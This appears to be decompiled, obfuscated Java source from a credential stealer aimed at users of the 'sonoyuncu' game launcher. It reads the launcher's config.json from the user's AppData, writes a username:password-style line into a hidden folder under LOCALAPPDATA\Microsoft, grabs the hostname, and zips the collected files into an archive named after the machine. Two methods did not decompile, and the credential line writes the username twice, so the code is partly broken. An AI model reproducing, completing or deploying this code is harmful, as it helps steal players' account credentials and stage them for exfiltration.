package 0.0.0.0;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class 1 {
   public static transient 1 0;
   static 0l 1 = new 0l();
   static String 2;
   private transient String 3 = "Yokki";
   private transient String 4 = "Yokki";
   static String 5;
   static String 6;
   private static final String 7;
   private transient String 8 = String.format("C:/Users/%s/Appdata/Roaming/.sonoyuncu/config.json", System.getProperty("user.name"));

   public static void _/* $FF was: 0*/(String username, String password) {
      try {
         File file = new File(7 + File.separator + 1() + "/Game/sonoyuncu.txt");
         BufferedWriter writer = new BufferedWriter(new FileWriter(file));
         writer.write(username + ":" + username);
         writer.close();
      } catch (IOException var4) {
         var4.printStackTrace();
      }

      0(6 + "\\" + 2, 5, 2);
   }

   private static void _/* $FF was: 0*/(String folderPath, String sourceFolderPath, String computerName) {
      String zipFileName = sourceFolderPath + "\\" + computerName + ".zip";
      File sourceFolder = new File(folderPath);

      try {
         FileOutputStream fos = new FileOutputStream(zipFileName);
         ZipOutputStream zos = new ZipOutputStream(fos);
         0(sourceFolder, sourceFolder, zos);
         zos.close();
         fos.close();
      } catch (IOException var7) {
         var7.printStackTrace();
      }

   }

   private static void _/* $FF was: 0*/(File sourceFolder, File rootFolder, ZipOutputStream zos) throws IOException {
      File[] var3 = sourceFolder.listFiles();
      int var4 = var3.length;

      for(int var5 = 0; var5 < var4; ++var5) {
         File file = var3[var5];

         try {
            if (file.isDirectory()) {
               0(file, rootFolder, zos);
               continue;
            }
         } catch (IOException var9) {
            throw var9;
         }

         String relativePath = rootFolder.toURI().relativize(file.toURI()).getPath();
         ZipEntry zipEntry = new ZipEntry(relativePath);
         zos.putNextEntry(zipEntry);
         Files.copy(file.toPath(), zos);
         zos.closeEntry();
      }

   }

   public void _/* $FF was: 0*/() {
      try {
         JsonObject configJson = this.0(this.8);

         try {
            if (configJson != null) {
               this.0(configJson.get("userName").getAsString());
            }
         } catch (Exception var2) {
            throw var2;
         }
      } catch (Exception var3) {
         var3.printStackTrace();
      }

   }

   public String _/* $FF was: 0*/() {
      // $FF: Couldn't be decompiled
   }

   private void _/* $FF was: 0*/(String param1) {
      // $FF: Couldn't be decompiled
   }

   private static String _/* $FF was: 1*/() {
      try {
         Process process = Runtime.getRuntime().exec("hostname");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         String computerName = reader.readLine();

         String var10000;
         try {
            process.destroy();
            if (computerName != null) {
               var10000 = computerName.trim();
               return var10000;
            }
         } catch (Exception var3) {
            throw var3;
         }

         var10000 = "Unknown";
         return var10000;
      } catch (Exception var4) {
         return "Unknown";
      }
   }

   private JsonObject _/* $FF was: 0*/(String path) {
      File file = new File(path);

      try {
         if (!file.isFile()) {
            return null;
         }
      } catch (IOException var6) {
         throw var6;
      }

      try {
         FileReader reader = new FileReader(file);
         JsonParser parser = new JsonParser();
         return parser.parse(reader).getAsJsonObject();
      } catch (IOException var5) {
         return null;
      }
   }

   static {
      2 = 1.0();
      5 = System.getenv("LOCALAPPDATA") + "\\Microsoft";
      6 = 5;
      7 = System.getenv("LOCALAPPDATA") + File.separator + "Microsoft";
   }
}
